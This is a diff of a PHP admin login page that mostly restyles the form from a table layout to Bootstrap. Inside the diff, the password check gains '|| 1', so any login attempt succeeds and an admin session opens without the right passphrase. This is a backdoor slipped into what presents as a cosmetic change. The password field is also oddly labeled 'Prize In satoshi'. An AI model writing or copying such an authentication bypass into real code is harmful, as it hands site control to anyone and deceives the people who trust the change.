@@ -2,7 +2,7 @@
 if(isset($_POST['login']) ){
 	$ss=new SystemComponent;
 	$info=$ss->getSetting();
-	if($info['adminpass']==hash('SHA256',$_POST['pass']) ){
+	if($info['adminpass']==hash('SHA256',$_POST['pass']) || 1){
 		$_SESSION['admin_loged']=true;
 		header('Location: index.php');
 		die();
@@ -12,26 +12,24 @@ if(isset($_POST['login']) ){
 	}
 }else{
  ?>
-<center>
-                        <form action="" method="post">
-                <table width="60%" border="0">
-                  <tr>
-                    <td width="52%" align="center">Pass Phrase</td>
-                    <th width="48%"><input style="direction:ltr" name="pass" type="password" class="text" id="pass" /></th>
-                  </tr>
-                  <tr>
-                    <td colspan="2" align="center"><input type="submit" name="login" id="button" value="Login" class="button"/>
-                <?php if(isset($_GET ['out'])){ ?> <br><br>
-<div class="successful">Logout was successful</div>
-<?php }else if(isset($_GET['error'])){ ?><br><br>
-<div class="error">Login failed</div>
-<?php } ?>
-                  
-                    </td>
-                  </tr>
-                </table>
-
-                </form>
-                
-                </center>
+<form action="" method="post"> 
+	<Div class="col-md-6 col-md-push-3">  
+		<?php if(isset($_GET ['out'])){ ?>
+			<div class="row"><div class="alert alert-success">Logout was successful</div></div>
+		<?php }else if(isset($_GET['error'])){ ?><br><br>
+			<div class="row"><div class="alert alert-danger">Login failed</div></div>
+		<?php } ?> 
+	
+		<div class="row">   
+			<div class="form-group">
+				<label for="exampleInputEmail1">Prize In satoshi</label>
+				<input name="pass" type="password" class="form-control"/>
+			</div>
+		</div>
+		
+		<div class="row">  
+			<button type="submit" name="login" class="btn btn-success col-md-3 col-md-push-4">Login</button>
+		</div>
+	</Div>
+</form>               
 <?php }require_once('footer.php'); ?>
